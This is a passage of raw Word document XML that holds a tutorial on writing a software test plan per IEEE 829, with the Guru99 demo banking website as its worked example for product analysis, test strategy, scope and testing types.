                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>understand</w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> the details of testing.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9"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Test Plan </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rStyle w:val="Strong"/>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>guides</w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> our thinking. It is like a rule book, which needs to be followed.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9"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Important aspects like test estimation, test scope, test strategy are </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rStyle w:val="Strong"/>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>documented</w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> in Test Plan, so it can be reviewed by Management Team and re-used for other projects.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:pStyle w:val="Heading3"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:spacing w:line="372" w:lineRule="atLeast"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>How to write a Test Plan</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:pStyle w:val="NormalWeb"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:rPr>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>You already know that making a </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rStyle w:val="Strong"/>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>Test Plan</w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t> is the most important task of Test Management Process. Follow the seven steps below to create a test plan as per IEEE 829</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Analyze the product</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Design the Test Strategy</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Define Test Criteria</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Define the Test Objectives</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Resource Planning</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Plan Test Environment</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Schedule &amp; Estimation</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9"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lastRenderedPageBreak/>
              <w:t>Determine Test Deliverables</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1) Analyze the product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How can you test a product </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>without</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> any information about it? The answer is </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>Impossible. </w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>You must learn a product </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>thoroughly </w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>before testing it.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product under test is Guru99 banking website. You should research clients and the end users to know their needs and expectations from the application</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidRDefault="00EC39D9"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Who will use the website?</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidRDefault="00EC39D9"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What is it used for?</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidRDefault="00EC39D9"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How will it work?</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidRDefault="00EC39D9"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What are software/ hardware the product uses?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can use the following approach to analyze the site</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:t>Now let’s apply above knowledge to a real product: </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rStyle w:val="Strong"/>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:t>Analyze</w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:t> the banking website </w:t>
            </w:r>
            <w:hyperlink r:id="rId55" w:history="1">
              <w:r w:rsidRPr="00E97930">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="40A2B5"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>http://demo.guru99.com/V4</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
            </w:pP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should take a </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>look around</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> this website and also </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>review </w:t>
            </w:r>
            <w:hyperlink r:id="rId56" w:history="1">
              <w:r w:rsidRPr="00E97930">
                <w:rPr>
                  <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="40A2B5"/>
                  <w:u w:val="single"/>
                </w:rPr>
                <w:t>product documentation</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>. Review of product documentation helps you to understand all the features of the website as well as how to use it. If you are unclear on any items, you might </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>interview</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> customer, developer, designer to get more information.</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 Develop Test Strategy</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Strategy is a </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>critical step </w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t xml:space="preserve">in making a Test Plan. A Test Strategy </w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>document,</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t xml:space="preserve"> is a high-level document, which is usually developed by Test Manager. This document defines:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidRDefault="00EC39D9" w:rsidP="00F97FFE">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project’s </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>testing objectives</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> and the means to achieve them</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidRDefault="00EC39D9" w:rsidP="00F97FFE">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Determines testing </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>effort</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costs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Back to your project, you need to develop Test Strategy for testing that banking website. You should follow steps below</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2.1) Define Scope of Testing</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Before the start of any test activity, scope of the testing should be known. You must think hard about it.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidRDefault="00EC39D9" w:rsidP="00F97FFE">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components of the system to be tested (hardware, software, middleware, etc.) are defined as "</w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>in scope</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>"</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidRDefault="00EC39D9" w:rsidP="00F97FFE">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components of the system that will not be tested also need to be clearly defined as being "</w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>out of scope</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w: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Defining the scope of your testing project is very important for all stakeholders. A precise scope helps you</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidRDefault="00EC39D9" w:rsidP="00F97FFE">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Give everyone a </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>confidence &amp; accurate information</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> of the testing you  are doing</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidRDefault="00EC39D9" w:rsidP="00F97FFE">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All project members will have a </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>clear</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> understanding about what is tested and what is not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i/>
                <w:iCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>How do you determine scope your project?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determine scope, you must –</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidRDefault="00EC39D9"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Precise customer requirement</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidRDefault="00EC39D9"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Project Budget</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidRDefault="00EC39D9"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Product Specification</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidRDefault="00EC39D9"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Skills &amp; talent of your test team</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Now should clearly define the "in scope" and "out of scope" of the testing.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidRDefault="00EC39D9" w:rsidP="00F97FFE">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As the software requirement </w:t>
            </w:r>
            <w:hyperlink r:id="rId57" w:anchor="heading=h.ftgetk7f23qj" w:history="1">
              <w:r w:rsidRPr="00E97930">
                <w:rPr>
                  <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="40A2B5"/>
                </w:rPr>
                <w:t>specs</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>, the project Guru99 Bank only focus on testing all the </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>functions</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> and external interface of website </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>Guru99</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> Bank (</w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t xml:space="preserve">in </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>scope</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>testing</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidRDefault="00EC39D9" w:rsidP="00F97FFE">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Nonfunctional testing such as </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>stress</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>, </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>performance</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> or </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>logical database</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> currently will not be tested. (</w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>out of</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> scope)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Problem Scenario</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customer wants you to test his API. But the project budget does not permit to do so. In such a case what will you do?</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Well, in such case you need to convince the customer that API testing is extra work and will consume significant resources. Give him data supporting your facts. Tell him if API testing is included in-scope the budget will increase by XYZ amount.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customer agrees and accordingly the new scopes, out of scope items are</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidRDefault="00EC39D9" w:rsidP="00F97FFE">
            <w:pPr>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="4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In-scope items: Functional Testing, API Testing</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidRDefault="00EC39D9" w:rsidP="00F97FFE">
            <w:pPr>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="4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Out of scope items: Database testing, hardware &amp; any other external interfaces</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2.2) Identify Testing Type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 </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>Testing Type</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> is a standard test procedure that gives an expected test outcome.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Each testing type is formulated to identify a specific type of product bugs. But, all Testing Types are aimed at achieving one common goal “</w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>Early detection of</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> all the defects before releasing the product to the customer”</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w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>commonly used</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> testing types are described as following figure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There are </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>tons of Testing Types</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> for testing software product. Your team </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>cannot have</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> enough efforts to handle all kind of testing. As Test Manager, you must set </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>priority</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> of the Testing Types</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidRDefault="00EC39D9" w:rsidP="00F97FFE">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Which Testing Types should be </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
